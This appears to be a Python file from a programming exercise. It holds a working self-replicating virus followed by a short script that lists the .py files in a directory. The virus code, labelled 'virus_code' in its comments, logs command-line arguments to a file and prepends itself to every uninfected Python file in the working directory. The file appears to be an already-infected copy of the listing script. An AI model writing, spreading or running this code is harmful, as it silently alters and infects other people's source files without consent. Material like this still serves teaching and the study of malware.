
with open("Q1C.out","a") as f:
    f.write(" ".join(__import__("sys").argv) + "\n")

from pathlib import Path
import sys

LOGFILE = "Q1C.out"

#read current script code
with open(__file__, "r", encoding="utf-8") as f:
    virus_code = f.read()

#loop through other python files in the directory
for input_file in Path.cwd().glob("*.py"):
    content = input_file.read_text(encoding="utf-8")
    if "Q1C.out" in content: #if it is already infected, continue
        continue
    
    payload = (
            '\nwith open("Q1C.out","a") as f:\n'
            '    f.write(" ".join(__import__("sys").argv) + "\\n")\n')
    #adds virus to python files 
    infect_code = payload + "\n" + virus_code + "\n" + content
    input_file.write_text(infect_code, encoding="utf-8")
         

from pathlib import Path

OUTFILE = "Q1A.out"


if __name__ == "__main__":
    current_dir = Path.cwd() #current directory
    pyfiles = list(current_dir.glob("*.py")) #find python files in directory
    filenames = [pyfile.name for pyfile in pyfiles] #gets just file names
    
    with open('Q1A.out', 'w') as file: #saves list of filenames on new lines
        for filename in filenames:
            file.write(f"{filename}\n") 


